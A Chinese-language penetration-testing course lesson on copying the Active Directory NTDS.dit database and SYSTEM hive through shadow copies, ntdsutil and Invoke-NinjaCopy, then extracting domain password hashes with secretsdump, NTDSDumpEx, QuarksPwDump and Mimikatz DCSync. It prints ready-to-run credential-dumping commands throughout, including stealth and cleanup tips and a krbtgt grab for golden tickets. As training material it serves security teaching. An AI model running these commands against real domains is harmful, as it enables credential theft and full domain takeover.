#  057：第22天 - 域内密码凭证获取及解密 🔐

![](img/b292be86923c54fb2de0acb80b573d30_1.png)

![](img/b292be86923c54fb2de0acb80b573d30_3.png)

![](img/b292be86923c54fb2de0acb80b573d30_5.png)

![](img/b292be86923c54fb2de0acb80b573d30_7.png)

![](img/b292be86923c54fb2de0acb80b573d30_9.png)

![](img/b292be86923c54fb2de0acb80b573d30_11.png)

![](img/b292be86923c54fb2de0acb80b573d30_13.png)

![](img/b292be86923c54fb2de0acb80b573d30_14.png)

![](img/b292be86923c54fb2de0acb80b573d30_16.png)

在本节课中，我们将学习如何从域控制器中获取存储所有域用户密码哈希的关键文件（NTDS.dit），并掌握多种解密该文件以提取哈希值的方法。这是域渗透中获取凭证、进行横向移动和权限维持的关键步骤。

![](img/b292be86923c54fb2de0acb80b573d30_18.png)

![](img/b292be86923c54fb2de0acb80b573d30_20.png)

![](img/b292be86923c54fb2de0acb80b573d30_22.png)

![](img/b292be86923c54fb2de0acb80b573d30_24.png)

![](img/b292be86923c54fb2de0acb80b573d30_26.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_28.png)

## 概述

![](img/b292be86923c54fb2de0acb80b573d30_30.png)

![](img/b292be86923c54fb2de0acb80b573d30_32.png)

活动目录数据库文件 `NTDS.dit` 存储着域内所有用户、组及其密码哈希等核心信息。由于Windows系统会阻止对该文件的直接访问和复制，我们需要利用特殊的技术来获取它。获取文件后，还需使用特定工具解密才能得到可用的密码哈希。

上一节我们介绍了域内信息收集的基本方法，本节中我们来看看如何获取并解密这个核心的凭证数据库。

![](img/b292be86923c54fb2de0acb80b573d30_34.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_36.png)

![](img/b292be86923c54fb2de0acb80b573d30_38.png)

![](img/b292be86923c54fb2de0acb80b573d30_40.png)

## 第一部分：获取NTDS.dit文件

![](img/b292be86923c54fb2de0acb80b573d30_42.png)

`NTDS.dit` 文件默认位于域控制器的 `C:\Windows\NTDS\` 目录下。Windows会锁定此文件，阻止直接复制。因此，我们需要利用“卷影复制服务”（Volume Shadow Copy Service, VSS）来创建该文件的副本。

以下是几种利用VSS获取文件的方法：

![](img/b292be86923c54fb2de0acb80b573d30_44.png)

### 1. 使用 ntdsutil 工具

`ntdsutil` 是Windows自带的Active Directory管理命令行工具，可用于创建快照并复制文件。

![](img/b292be86923c54fb2de0acb80b573d30_46.png)

![](img/b292be86923c54fb2de0acb80b573d30_48.png)

![](img/b292be86923c54fb2de0acb80b573d30_50.png)

**交互式方法（理解流程）：**
打开命令提示符（cmd），按顺序执行以下命令：
```cmd
ntdsutil
snapshot
activate instance ntds
create
mount {快照GUID}
```
执行 `mount` 命令后，系统会返回一个挂载路径（如 `C:\$SNAP_202203211134_VOLUMEC$\`）。通过此路径即可访问并复制 `NTDS.dit` 文件。操作完成后，需卸载并删除快照：
```cmd
unmount {快照GUID}
delete {快照GUID}
quit
quit
```

**非交互式方法（实战常用）：**
以下命令可一行完成创建快照、复制文件、清理痕迹的操作：
```cmd
ntdsutil "ac i ntds" "snapshot" "create" "mount {GUID}" "copy C:\$SNAP_{GUID}_VOLUMEC$\Windows\NTDS\ntds.dit C:\ntds.dit" "unmount {GUID}" "delete {GUID}" quit quit
```

![](img/b292be86923c54fb2de0acb80b573d30_52.png)

### 2. 使用 vssadmin 工具

![](img/b292be86923c54fb2de0acb80b573d30_54.png)

`vssadmin` 同样是系统自带的卷影副本服务管理工具。

以下是使用步骤：
1.  列出已有快照：`vssadmin list shadows`
2.  为系统盘创建新快照：`vssadmin create shadow /for=C:`
3.  复制文件。命令会返回“卷影副本装载点”（如 `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`）。使用copy命令复制文件：
    ```cmd
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
    ```
4.  删除快照：`vssadmin delete shadows /shadow={快照ID}`

![](img/b292be86923c54fb2de0acb80b573d30_56.png)

![](img/b292be86923c54fb2de0acb80b573d30_58.png)

![](img/b292be86923c54fb2de0acb80b573d30_60.png)

![](img/b292be86923c54fb2de0acb80b573d30_61.png)

### 3. 使用 diskshadow 工具

![](img/b292be86923c54fb2de0acb80b573d30_63.png)

![](img/b292be86923c54fb2de0acb80b573d30_65.png)

`diskshadow` 是微软官方工具，功能强大。通常需要从Windows SDK中获取或使用预编译版本。

基本使用命令如下：
```cmd
diskshadow /s script.txt
```
其中 `script.txt` 文件内容包含创建快照、暴露卷、复制文件的指令。

### 4. 使用 NinjaCopy (PowerShell脚本)

![](img/b292be86923c54fb2de0acb80b573d30_67.png)

![](img/b292be86923c54fb2de0acb80b573d30_69.png)

![](img/b292be86923c54fb2de0acb80b573d30_71.png)

`Invoke-NinjaCopy` 是一个PowerShell脚本，它不依赖VSS服务，因此不会产生相关事件日志，更为隐蔽。

![](img/b292be86923c54fb2de0acb80b573d30_73.png)

![](img/b292be86923c54fb2de0acb80b573d30_75.png)

![](img/b292be86923c54fb2de0acb80b573d30_77.png)

![](img/b292be86923c54fb2de0acb80b573d30_78.png)

![](img/b292be86923c54fb2de0acb80b573d30_80.png)

![](img/b292be86923c54fb2de0acb80b573d30_82.png)

**在CS中加载并使用：**
1.  将脚本上传到目标主机，或在CS中远程加载：
    ```powershell
    powershell-import /path/to/Invoke-NinjaCopy.ps1
    ```
2.  执行脚本复制文件：
    ```powershell
    powershell Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\ntds.dit"
    ```
    同样可以复制 `SYSTEM` 注册表文件：`-Path "C:\Windows\System32\config\SYSTEM"`

![](img/b292be86923c54fb2de0acb80b573d30_83.png)

![](img/b292be86923c54fb2de0acb80b573d30_85.png)

![](img/b292be86923c54fb2de0acb80b573d30_87.png)

![](img/b292be86923c54fb2de0acb80b573d30_89.png)

![](img/b292be86923c54fb2de0acb80b573d30_90.png)

![](img/b292be86923c54fb2de0acb80b573d30_92.png)

![](img/b292be86923c54fb2de0acb80b573d30_94.png)

**注意：** 解密 `NTDS.dit` 通常需要同时获取 `SYSTEM` 注册表文件，其中包含解密所需的密钥。

![](img/b292be86923c54fb2de0acb80b573d30_96.png)

![](img/b292be86923c54fb2de0acb80b573d30_98.png)

![](img/b292be86923c54fb2de0acb80b573d30_100.png)

![](img/b292be86923c54fb2de0acb80b573d30_102.png)

![](img/b292be86923c54fb2de0acb80b573d30_104.png)

![](img/b292be86923c54fb2de0acb80b573d30_106.png)

![](img/b292be86923c54fb2de0acb80b573d30_108.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_110.png)

![](img/b292be86923c54fb2de0acb80b573d30_112.png)

![](img/b292be86923c54fb2de0acb80b573d30_114.png)

## 第二部分：解密NTDS.dit文件

获取 `NTDS.dit` 和 `SYSTEM` 文件后，我们需要使用工具从中提取用户密码哈希。

![](img/b292be86923c54fb2de0acb80b573d30_116.png)

![](img/b292be86923c54fb2de0acb80b573d30_118.png)

![](img/b292be86923c54fb2de0acb80b573d30_119.png)

![](img/b292be86923c54fb2de0acb80b573d30_121.png)

![](img/b292be86923c54fb2de0acb80b573d30_123.png)

![](img/b292be86923c54fb2de0acb80b573d30_125.png)

![](img/b292be86923c54fb2de0acb80b573d30_126.png)

### 1. 使用 Quarks PwDump

![](img/b292be86923c54fb2de0acb80b573d30_128.png)

![](img/b292be86923c54fb2de0acb80b573d30_130.png)

![](img/b292be86923c54fb2de0acb80b573d30_132.png)

这是一个Windows凭据提取工具，可以离线处理 `NTDS.dit` 文件。
```cmd
QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit --output ntds-hashes.txt
```

### 2. 使用 Impacket 套件中的 secretsdump.py

![](img/b292be86923c54fb2de0acb80b573d30_134.png)

![](img/b292be86923c54fb2de0acb80b573d30_135.png)

Impacket是渗透测试中常用的Python工具集。`secretsdump.py` 可以解析本地文件。
```bash
python3 secretsdump.py -system SYSTEM.reg -ntds ntds.dit LOCAL
```
或者使用编译好的exe版本：
```cmd
secretsdump.exe -system SYSTEM.reg -ntds ntds.dit LOCAL
```

![](img/b292be86923c54fb2de0acb80b573d30_137.png)

![](img/b292be86923c54fb2de0acb80b573d30_139.png)

### 3. 使用 NTDSDumpEx

这是一个高效的专用工具，可以快速提取信息。
```cmd
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.reg -o hashes.txt
```

![](img/b292be86923c54fb2de0acb80b573d30_141.png)

### 4. 使用 Mimikatz (DCSync攻击 - 在线提取)

![](img/b292be86923c54fb2de0acb80b573d30_143.png)

![](img/b292be86923c54fb2de0acb80b573d30_145.png)

![](img/b292be86923c54fb2de0acb80b573d30_147.png)

![](img/b292be86923c54fb2de0acb80b573d30_149.png)

![](img/b292be86923c54fb2de0acb80b573d30_151.png)

![](img/b292be86923c54fb2de0acb80b573d30_153.png)

![](img/b292be86923c54fb2de0acb80b573d30_155.png)

无需下载文件，Mimikatz可以利用域控制器同步协议（DCSync）直接从在线域控拉取指定用户的哈希。

![](img/b292be86923c54fb2de0acb80b573d30_157.png)

![](img/b292be86923c54fb2de0acb80b573d30_159.png)

![](img/b292be86923c54fb2de0acb80b573d30_161.png)

![](img/b292be86923c54fb2de0acb80b573d30_162.png)

![](img/b292be86923c54fb2de0acb80b573d30_164.png)

![](img/b292be86923c54fb2de0acb80b573d30_165.png)

![](img/b292be86923c54fb2de0acb80b573d30_166.png)

![](img/b292be86923c54fb2de0acb80b573d30_167.png)

![](img/b292be86923c54fb2de0acb80b573d30_168.png)

![](img/b292be86923c54fb2de0acb80b573d30_170.png)

![](img/b292be86923c54fb2de0acb80b573d30_172.png)

![](img/b292be86923c54fb2de0acb80b573d30_173.png)

**在CS中执行Mimikatz命令：**
-   获取域内所有用户哈希：
    ```cmd
    mimikatz lsadump::dcsync /domain:mingy.com /all /csv
    ```
-   获取特定用户（如krbtgt）的哈希（用于黄金票据攻击）：
    ```cmd
    mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt
    ```

![](img/b292be86923c54fb2de0acb80b573d30_175.png)

![](img/b292be86923c54fb2de0acb80b573d30_176.png)

![](img/b292be86923c54fb2de0acb80b573d30_178.png)

![](img/b292be86923c54fb2de0acb80b573d30_180.png)

![](img/b292be86923c54fb2de0acb80b573d30_182.png)

**注意：** DCSync攻击需要域用户权限，且该用户拥有复制目录更改的权限（默认域管理员组有此权限）。

![](img/b292be86923c54fb2de0acb80b573d30_184.png)

![](img/b292be86923c54fb2de0acb80b573d30_186.png)

![](img/b292be86923c54fb2de0acb80b573d30_187.png)

---

![](img/b292be86923c54fb2de0acb80b573d30_189.png)

![](img/b292be86923c54fb2de0acb80b573d30_191.png)

## 总结

![](img/b292be86923c54fb2de0acb80b573d30_193.png)

![](img/b292be86923c54fb2de0acb80b573d30_195.png)

本节课我们一起学习了域渗透中获取密码凭证的核心技术。首先，我们了解了 `NTDS.dit` 文件的重要性及其受保护的特性。接着，我们掌握了多种绕过保护、获取该文件的方法，包括使用 `ntdsutil`、`vssadmin`、`diskshadow` 等系统工具以及 `Invoke-NinjaCopy` PowerShell脚本。最后，我们学习了使用 `Quarks PwDump`、`Impacket-secretsdump`、`NTDSDumpEx` 等工具解密文件，以及利用 `Mimikatz` 进行在线DCSync攻击来直接提取哈希值。

![](img/b292be86923c54fb2de0acb80b573d30_197.png)

![](img/b292be86923c54fb2de0acb80b573d30_199.png)

![](img/b292be86923c54fb2de0acb80b573d30_201.png)

获取到的域用户密码哈希是后续进行横向移动、权限维持（如票据攻击）的基础。请务必在授权环境下练习这些技术，并理解其原理。